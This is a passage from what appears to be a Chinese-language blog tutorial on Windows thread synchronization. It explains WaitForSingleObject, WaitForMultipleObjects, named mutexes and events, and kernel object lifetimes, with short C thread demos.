function_\">WaitForSingleObject</span><span class=\"params\">(\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">  HANDLE hHandle,        <span class=\"comment\">// handle to object\t\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  DWORD dwMilliseconds   <span class=\"comment\">// time-out interval\t\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">功能说明：\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">等待函数可使线程自愿进入等待状态，直到一个特定的内核对象变为已通知状态为止.\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">hHandle:\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">内核对象句柄，可以是进程也可以是线程.\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">dwMilliseconds:\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">等待时间，单位是毫秒  INFINITE(<span class=\"number\">-1</span>)一直等待\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">返回值：\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">WAIT_OBJECT_0(<span class=\"number\">0</span>)\t\t\t等待对象变为已通知\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">WAIT_TIMEOUT(<span class=\"number\">0x102</span>)\t\t\t超时\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">特别说明：\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">1</span>、内核对象中的每种对象都可以说是处于已通知或未通知的状态之中\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">2</span>、这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">3</span>、当线程正在运行的时候，线程内核对象处于未通知状态\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">4</span>、当线程终止运行的时候，它就变为已通知状态\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">5</span>、在内核中就是个BOOL值，运行时FALSE 结束TRUE\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">代码演示：\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc1</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5</span>;i++)\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;+++++++++\\n&quot;</span>);\t\t\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t\t\t\t</span></span><br><span class=\"line\">\tHANDLE hThread1 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc1, \t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tDWORD dwCode = ::WaitForSingleObject(hThread1, INFINITE);\t</span><br><span class=\"line\">    <span class=\"comment\">//DWORD dwCode = ::WaitForSingleObject(hThread1, INFINITE);\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//如果这样写可能导致程序无法继续向下执行，因为有些内核对象执行完之后会将变为未通知状态，但是线程和进程不会\t</span></span><br><span class=\"line\">    <span class=\"comment\">//DWORD dwCode = ::WaitForSingleObject(hThread1, INFINITE);\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tMessageBox(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"waitformultipleobjects\"><a class=\"markdownIt-Anchor\" href=\"#waitformultipleobjects\">#</a> WaitForMultipleObjects</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD <span class=\"title function_\">WaitForMultipleObjects</span><span class=\"params\">(\t\t\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">  DWORD nCount,             <span class=\"comment\">// number of handles in array\t\t\t\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  CONST HANDLE *lpHandles,  <span class=\"comment\">// object-handle array\t\t\t\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  BOOL bWaitAll,            <span class=\"comment\">// wait option\t\t\t\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  DWORD dwMilliseconds      <span class=\"comment\">// time-out interval\t\t\t\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">功能说明：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">同时查看若干个内核对象的已通知状态\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">nCount：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">要查看内核对象的数量\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">lpHandles：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">内核对象数组\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">bWaitAll：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">等到类型  TRUE 等到所有变为已通知  FALSE 只要有一个变为已通知\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">dwMilliseconds：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">超时时间\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">INFINITE一直等待\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">返回值：\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">bWaitAll为TRUE时，返回WAIT_OBJECT_0(<span class=\"number\">0</span>) 代码所以内核对象都变成已通知\t\t\t\t\t\t\t\t</span><br><span class=\"line\">bWaitAll为FALSE时，返回最先变成已通知的内核对象在数组中的索引\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">WAIT_TIMEOUT(<span class=\"number\">0x102</span>)\t\t\t超时\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">bWaitAll</span><br><span class=\"line\"><span class=\"literal\">true</span> 所有内核对象都结束之后才</span><br><span class=\"line\"><span class=\"literal\">false</span> 有一个内核对象结束就行</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc1</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5</span>;i++)\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;+++++++++\\n&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc2</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------\\n&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\tHANDLE hArray[<span class=\"number\">2</span>];\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t\t\t\t\t\t</span></span><br><span class=\"line\">\tHANDLE hThread1 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc1, \t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t\t\t\t\t\t</span></span><br><span class=\"line\">\tHANDLE hThread2 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc2, \t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\thArray[<span class=\"number\">0</span>] = hThread1;\t\t\t\t\t\t</span><br><span class=\"line\">\thArray[<span class=\"number\">1</span>] = hThread2;\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\tDWORD dwCode = ::WaitForMultipleObjects(<span class=\"number\">2</span>, hArray,FALSE,INFINITE);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\tMessageBox(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>互斥体：跨进程线程控制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进程一：</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE g_hMutex = CreateMutex(<span class=\"literal\">NULL</span>,FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);    <span class=\"comment\">//第一个参数为空代表不是内核对象</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">进程二：</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">WaitForSingleObject(g_hMutex,INFINITE);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//逻辑代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">ReleaseMutex(g_hMutex);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">进程三：</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">WaitForSingleObject(g_hMutex,INFINITE);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//逻辑代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">ReleaseMutex(g_hMutex);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">互斥体与临界区的区别：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span>、临界区只能用于单个进程间的线程控制.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2</span>、互斥体可以设定等待超时，但临界区不能.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3</span>、线程意外终结时，Mutex可以避免无限等待.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4</span>、Mutex效率没有临界区高.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"内核对象\"><a class=\"markdownIt-Anchor\" href=\"#内核对象\">#</a> 内核对象</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230819183130009.png\" alt=\"image-20230819183130009\"></p>\n<p>进程、线程、文件、文件映射、事件、互斥体等等都是内核对象</p>\n<p>内核对象会保留一个计数器，只有当计数器为 0 时内核对象才被销毁。互斥体就是一个内核对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2、事件内核对象的创建\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = CreateEvent(NULL, TRUE, FALSE, &quot;XYZ&quot;);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hMutex = CreateMutex(NULL,FALSE, &quot;XYZ&quot;);\t\t\t  // 返回的是指针的指针，为了防止错误修改内核对象\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">3、事件内核对象的获取\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE OpenEvent(\t\t\t\t\t\t\t</span><br><span class=\"line\">  DWORD dwDesiredAccess,  // access\t\t\t\t\t\t\t</span><br><span class=\"line\">  BOOL bInheritHandle,    // inheritance option\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpName          // object name\t\t\t\t\t\t\t</span><br><span class=\"line\">);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, &quot;XYZ&quot;);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, &quot;XYZ&quot;);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">4、内核对象的销毁\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL CloseHandle(HANDLE hobj);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">(1)、当没有其他程序引用时，系统会销毁内核对象(使用数量).\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">(2)、内核对象的生命周期，可能比创建它的对象要长.\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>内核对象会维护一个计数器，当计数器为 0 的时候系统会销毁这个内核对象</p>\n<p>CreateMutex +1</p>\n<p>closehandle -1</p>\n<p>oepnmutex +1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进程一：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = CreateEvent(<span class=\"literal\">NULL</span>, TRUE, FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">SetEvent(g_hEvent);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">进程二：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">WaitForSingleObject(g_hEvent, INFINITE);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">实验一：内核对象的生命周期\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">进程一：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = CreateEvent(<span class=\"literal\">NULL</span>, TRUE, FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">SetEvent(g_hEvent);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">进程二：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, <span class=\"string\">&quot;XYZ&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">WaitForSingleObject(g_hEvent, INFINITE);\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>内核对象是否销毁会取决于上面三个进程的执行顺序</p>\n<h3 id=\"事件对象\"><a class=\"markdownIt-Anchor\" href=\"#事件对象\">#</a> 事件对象</h3>\n<p>时间可以做线程同步。在于 CreateEvent 的第二个和第三个参数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、事件对象的创建\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">HANDLE <span class=\"title function_\">CreateEvent</span><span class=\"params\">(\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LPSECURITY_ATTRIBUTES lpEventAttributes, <span class=\"comment\">// 安全属性 NULL时为系统默认\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  BOOL bManualReset,                       <span class=\"comment\">// TRUE 通过调用ResetEvent将事件对象标记为未通知。</span></span></span><br><span class=\"line\"><span class=\"params\">  <span class=\"comment\">// 执行完wait之后如果这个是true，那么还是保持已通知。如果是false wait结束之后会自动变为未通知，如果不手动设置，别的线程会一直阻塞</span></span></span><br><span class=\"line\"><span class=\"params\">  <span class=\"comment\">// true 适用于读操作，实现互斥需要设置为false，并且在最后调用setevent</span></span></span><br><span class=\"line\"><span class=\"params\">  BOOL bInitialState,                      <span class=\"comment\">// TRUE 已通知状态  FALSE未通知状态\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  LPCTSTR lpName                           <span class=\"comment\">// 对象名称 